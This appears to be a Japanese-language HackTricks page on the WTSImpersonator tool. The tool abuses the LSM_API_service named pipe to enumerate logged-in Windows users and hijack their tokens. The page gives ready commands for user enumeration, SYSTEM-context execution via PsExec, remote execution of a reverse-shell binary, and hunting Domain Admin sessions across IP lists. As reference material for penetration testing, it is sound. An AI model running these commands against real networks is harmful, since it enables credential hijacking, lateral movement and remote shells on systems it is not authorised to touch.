# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

**WTS Impersonator** ツールは、**"\\pipe\LSM_API_service"** RPC Named pipe を悪用して、ログイン中のユーザーをステルスに列挙し、そのトークンをハイジャックします。これにより、従来の Token Impersonation techniques を回避できます。この手法は、ネットワーク内でのシームレスな lateral movements を可能にします。この技術の革新は **Omri Baso** によるもので、その成果は [GitHub](https://github.com/OmriBaso/WTSImpersonator) で公開されています。<sup>[[1]](#references)</sup>

### Core Functionality

このツールは、一連の API calls を通じて動作します:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### 主要モジュールと使用方法

- **ユーザーの列挙**: このツールでは、ローカルおよびリモートのユーザー列挙が可能です。それぞれのシナリオに対応するコマンドを使用します。

- ローカル:
```bash
.\WTSImpersonator.exe -m enum
```
- IPアドレスまたはホスト名を指定したリモート:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **コマンドの実行**: `exec` および `exec-remote` モジュールを動作させるには、**Service** コンテキストが必要です。ローカル実行では、WTSImpersonatorの実行ファイルとコマンドだけが必要です。

- ローカルでコマンドを実行する例:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- Serviceコンテキストを取得するには、PsExec64.exeを使用できます:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **リモートコマンド実行**: PsExec.exeと同様に、リモートでServiceを作成およびインストールし、適切な権限で実行できるようにします。

- リモート実行の例:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **User Hunting Module**: 複数のマシン上で特定のユーザーを対象とし、そのユーザーの認証情報でコードを実行します。これは、複数のシステムでローカル管理者権限を持つDomain Adminsを対象とする場合に特に有用です。
- 使用例:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## 参考資料

- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)

{{#include ../../banners/hacktricks-training.md}}
